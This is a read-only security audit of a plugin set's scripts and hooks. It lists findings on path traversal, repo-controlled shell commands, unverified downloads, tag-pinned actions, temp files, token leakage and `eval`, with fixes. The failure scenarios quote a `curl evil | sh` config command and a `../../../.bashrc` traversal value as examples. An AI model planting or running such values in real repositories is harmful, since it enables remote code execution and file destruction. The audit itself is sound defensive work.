# Security audit: dev-standards plugin scripts and hooks (2026-11-01)

**Task:** DS145. **Type:** read-only audit. No code, config or other doc was changed. No exploit was run; every finding is reasoned from the code.
**Procedure:** `claude/plugins/audits/skills/security-audit/SKILL.md` (P0 to P3 rubric, mapped to NIST SP 800-53, ISO 27001/27040, SOC 2, NIS2).

## Summary

| Severity | Count |
| --- | ---: |
| P0 Critical | 0 |
| P1 High | 0 |
| P2 Medium | 2 |
| P3 Low | 6 |

No finding lets a remote attacker act without a precondition. Both P2 findings need a hostile repository that the user then runs a plugin command in. The hooks themselves are in good shape (see "Clean areas").

## Findings

### Finding 1: Artifact manifest `file` is joined to a path without a check

- **Severity:** P2
- **Mapping:** NIST SP 800-53 SI-10 (input validation), AC-6; ISO 27001 A.8.28
- **Location:** `claude/plugins/artifacts/scripts/project_artifacts.py:730-734` (`html_path`, `write_html`), `:517-519` (`write_text`), `:2375-2377` (`retire`, `page.unlink()`)
- **Defect:** the `file` value of each entry in the record's `manifest.json` is used as `rec.dir / entry['file']` with no check that it is a plain file name inside the record folder. Keys are checked with `KEY_RE`; `file` is only checked to be a string. `record_dir` is checked well (`artifact_queue.check_record_rel`).
- **Failure scenario:** a cloned repository ships `docs/artifacts/manifest.json` with `"file": "../../../.bashrc"`. The user (or an agent) runs a writing command such as render or retire. The plugin writes rendered HTML over that file, or `retire` deletes it, with the user's rights. The write content is plugin-rendered HTML, so this is mostly file damage, but a shell start-up file or a tracked hook file can be replaced.
- **Fix:** accept `file` only if it matches `^[a-z0-9-]+\.html$`; also resolve the final path and refuse anything outside `rec.dir`. Do this in `Record.load`, so every caller is covered.

### Finding 2: Repository files choose what gets executed (`shell=True` and script paths)

- **Severity:** P2 (by design, but no guard)
- **Mapping:** NIST SP 800-53 SI-10, CM-7; ISO 27001 A.8.28; NIS2 Art 21(2)(e)
- **Location:**
  - `claude/plugins/docs/scripts/docs_check.py:227` (`docs.json` `generated_reference.command`, `subprocess.run(..., shell=True)`)
  - `claude/plugins/delivery/scripts/delivery_watch.py:649-656` and `:683` (`runner_plan.script` from `.delivery/config.json`, or `scripts/delivery/runner_plan.py`, started with `sys.executable`)
  - copied into projects: `.../tooling/shared/scripts/delivery/run_suite.py:224,280`, `delivery_common.py:881,945`, `smoke_packaged.py:112` (commands from `gate.json` / `smoke.json`, `shell=True`)
- **Defect:** commands and script paths come from files in the repository and are run through a shell or the interpreter with no allow-list. `run_suite.py` does quote the `{cases}` argument with `shlex.quote`, which is correct.
- **Failure scenario:** an agent opens an untrusted repository that has `docs/docs.json` with `"command": "curl evil | sh"`. Running `docs_check.py` (the docs gate) runs it with the user's rights and environment, including tokens. The same holds for a `runner_plan.script` pointing to an absolute path outside the repo when `delivery_watch.py` is started.
- **Verified limits:** the Stop and SessionStart hooks of `luismc-docs` call only `check_map`, which does not run `generated_reference`. No hook runs these commands. They run only when a person or agent starts the gate, the watcher or the suite. Running a repo's own test or build commands is the normal trust model; this is a gap only for repos the user has not yet reviewed.
- **Fix:** keep the behavior, but (a) document that these files are code and are trusted only after review; (b) make `docs_check.py` skip `generated_reference` unless `--reference` is passed explicitly or the branch is the project's own (it already has `--no-reference`); (c) refuse `runner_plan.script` paths that resolve outside the repo root.

### Finding 3: Mermaid download has no integrity check

- **Severity:** P3
- **Mapping:** NIST SP 800-53 SI-7, SA-12; ISO 27001 A.8.30; NIS2 Art 21(2)(d)
- **Location:** `claude/plugins/docs/scripts/docs_index.py:548-553` (`fetch-mermaid`)
- **Defect:** the script downloads `mermaid.min.js` from a CDN at a pinned version over HTTPS, and writes it into `docs/_site/vendor/` with no hash comparison.
- **Failure scenario:** a CDN or package compromise serves altered JavaScript. It is vendored into the docs site and runs in every reader's browser. The command is explicit and manual, and the version is pinned, so the chain is long.
- **Fix:** store the expected SHA-256 next to `MERMAID_VERSION` and refuse the file when it differs.

### Finding 4: Gitleaks fallback trusts a checksum from the same origin

- **Severity:** P3
- **Mapping:** NIST SP 800-53 SI-7, SA-12; ISO 27001 A.8.30
- **Location:** `.../tooling/shared/scripts/delivery/agent_setup.sh:152-170` (embedded installer); `.../tooling/*/.github/workflows/ci.yml` secret-scan step (for example `ts/ci.yml:178-184`)
- **Defect:** when `tools.json` holds only a version (old form) and no `sha256`, the checksum file is fetched from the same release as the archive. An attacker who can replace the archive can replace the checksum file too. With a pin, the check is sound. The CI step prints a warning.
- **Failure scenario:** a project keeps the old `tools.json` form. A tampered release asset is installed and runs in CI and on developer machines. Precondition: compromise of the upstream release.
- **Fix:** drop the old-form fallback after a deprecation date, or fail closed when the pin is empty. `tools_pin.py` already writes pins.

### Finding 5: GitHub Actions are pinned by tag, not by commit

- **Severity:** P3
- **Mapping:** NIST SP 800-53 SA-12, SI-7; SOC 2 CC9.2; NIS2 Art 21(2)(d)
- **Location:** workflow templates under `.../tooling/**/.github/workflows/`: `actions/checkout@v4` (23 uses), `setup-node/python/go/dotnet`, `actions/cache@v4`, `upload-artifact@v4`, `golangci/golangci-lint-action@v6`, `Swatinem/rust-cache@v2`, `dtolnay/rust-toolchain@stable`
- **Defect:** a moving tag can be re-pointed. `@stable` is a branch name. The workflows do set least-privilege `permissions:` blocks, which limits the damage.
- **Failure scenario:** a third-party action is compromised and its tag moved; the new code runs with the job's token. Highest risk is the three third-party (non-`actions/`) actions.
- **Fix:** pin third-party actions to a full commit SHA with the tag in a comment; let a dependency bot update them.

### Finding 6: Predictable file name in the shared temp directory

- **Severity:** P3
- **Mapping:** NIST SP 800-53 SC-4, AC-3; CWE-377
- **Location:** `claude/plugins/delivery/scripts/load.py:228-229` (cache path), `:253-256` (`cache_file() + '.%d.tmp' % os.getpid()`, then `open(tmp, 'w')` and `os.replace`)
- **Defect:** the load cache is `/tmp/luismc-delivery-load.json` for every user of the machine, and the temp name is guessable (pid). The write follows symlinks.
- **Failure scenario:** on a shared Linux host or shared runner, another local user pre-creates a symlink `/tmp/luismc-delivery-load.json.<pid>.tmp` to a file the victim owns; the hook overwrites it with JSON. The same user can also plant a fake sample so the load guard (DL-77/78) wrongly allows or refuses heavy work. Single-user machines are not affected.
- **Fix:** put the cache in a per-user directory (`~/.claude/`, as the machine config already is), or use `tempfile.mkstemp` in a per-user directory and open with `O_NOFOLLOW`.

### Finding 7: Bearer token sent to the `Link: next` URL without a host check

- **Severity:** P3 (unverified structural risk)
- **Mapping:** NIST SP 800-53 SC-8, IA-5; CWE-522
- **Location:** `.../tooling/shared/scripts/delivery/artifact_prune.py:68-79` (REST fallback, used when `gh` is missing)
- **Defect:** the next page URL is taken from the response header and requested with the same `Authorization` header, with no check that it starts with `https://api.github.com/`. The first URL is fixed and the header comes from GitHub, so this cannot be exploited unless that response is spoofed or redirected.
- **Failure scenario:** none confirmed. If a proxy or a bug returned a foreign `next` URL, the `GITHUB_TOKEN` would go to that host. The token is job-scoped (`actions: write`).
- **Fix:** refuse a `next` URL whose host is not `api.github.com`.

### Finding 8: `eval` on build-script expressions in a migration tool

- **Severity:** P3
- **Mapping:** NIST SP 800-53 SI-10; CWE-95
- **Location:** `tools/convert_interim_record.py:152`
- **Defect:** values are evaluated with `eval` and `{'__builtins__': {'dict': dict}}`. The comment says "literals and dict() only", but nothing enforces it; an attribute chain can reach other objects. Emptied builtins are not a sandbox.
- **Failure scenario:** a user runs the one-off converter on a `build.py` from a hostile source; an expression in a wanted assignment runs code. The tool is a manual migration helper and the input is the user's own file, so the exposure is small.
- **Fix:** use `ast.literal_eval`, and handle the `dict(...)` call by walking the AST node.

## Clean areas

- **Hook input (all four plugins):** every hook reads JSON from stdin inside a try block and fails open. `tool_input.command` is only parsed (`shlex`, a small tokenizer) and matched, never run, never put in a shell string. `cwd` is used to find `.delivery/` and as the `cwd` of fixed `git`/`gh` calls. `session_id` is used only as a dictionary key, never in a path. `transcript_path` is opened read-only (`hook_stop.py:59-64`) and only the last message text is regex-matched.
- **Subprocess calls in the plugin scripts:** all use argument lists (`git`, `gh`, `ps`, `powershell`); no `shell=True` in any hook or plugin script except Finding 2. `docs_lib.git` uses `-C root` and `--` before paths. Branch and ref values come from git output or the user's CLI, not from the hook JSON.
- **Writes outside the repo:** only `~/.claude/` files (machine config read, runner-gate log append) and the temp cache (Finding 6). The `.tmp` plus `os.replace` pattern is used for state files, all inside the project. Hook logs hold rule ids and short messages; no tokens or environment values are written.
- **Network calls:** only the Mermaid fetch (Finding 3), `gh` / GitHub API calls in the copied tooling, a health-URL probe in `smoke_packaged.py` (the product's own configured URL), and the gitleaks download (Finding 4). The plugin hooks make none.
- **Secrets:** the shipped `.githooks/pre-commit`, `.gitleaks.toml` and full-history scan step are sound; the commit-msg hook blocks AI attribution lines. Workflow templates pass tokens through `env:` and not inline in `run:`.
- **Workflow injection:** the one `${{ }}` value inside a `run:` line is `github.event.pull_request.number` (`train-cleanup.yml:41`), an integer, and the job runs only for merged PRs. No `pull_request_target`.
- **`rmtree` / `unlink` targets:** `docs_work.py:94`, `docs_index.py:386`, `fast_guards.py:123`, `template_build_check.py:257,435` act on fixed paths under the repo or a self-made temp dir. `rmtree` refuses a symlink target.
- **`record_dir`:** `check_record_rel` rejects absolute paths, `..` and anything outside `docs/`.
- **Temp files that are safe:** `delivery_doctor.py:94` and `template_build_check.py:422` use `mkstemp` / `mkdtemp`. `agent_setup.sh` uses `mktemp -d` with a cleanup trap and runs its Python with `-I`.
- **transcript-folds:** the TypeScript hook folds display text; it has no `exec`, file write or network call (grep-confirmed).

## Scope and what was not covered

**Read:** `claude/plugins/*/scripts/`, `claude/plugins/*/hooks/` (including `transcript-folds`), the shipped tooling under `claude/plugins/project-setup/skills/tech-stack-setup/assets/tooling/` (scripts, git hooks, workflow templates, `tools.json`), and `tools/*.py`.

**Method:** pattern search for dangerous calls (`shell=True`, `eval`, `Popen`, `urlopen`, temp files, `rmtree`, `unlink`, `expanduser`) across the scope, then a read of each hit and of the hook entry points. The large files (`project_artifacts.py`, `render_artifacts.py`, `delivery_ledger.py`, `delivery_watch.py`) were read at the risky spots, not line by line.

**Not covered:**
- `test_*.py` files and test fixtures.
- `claude/plugins/agents`, `specs`, `audits`, `project-setup` skill text (prompts and Markdown, no executable code in scope). Prompt-injection risk from skill and rule text was not assessed.
- The `ts`, `go`, `rust` and `dotnet` guard sources (conflict-marker tests) and tool configs (lint, vitest, playwright) beyond a pattern search.
- `render_artifacts.py` output escaping (HTML/XSS in generated artifact pages) was not traced end to end.
- Dependencies and their CVEs; nothing was installed or scanned.
- Anything run at runtime: no hook, script or workflow was executed, and `.github/workflows/` of this repo was not in scope.
- The SKILL checklist items for tenants, sessions, JWTs, Redis and Drizzle do not apply: these scripts have no tenants, sessions, database or web endpoints.
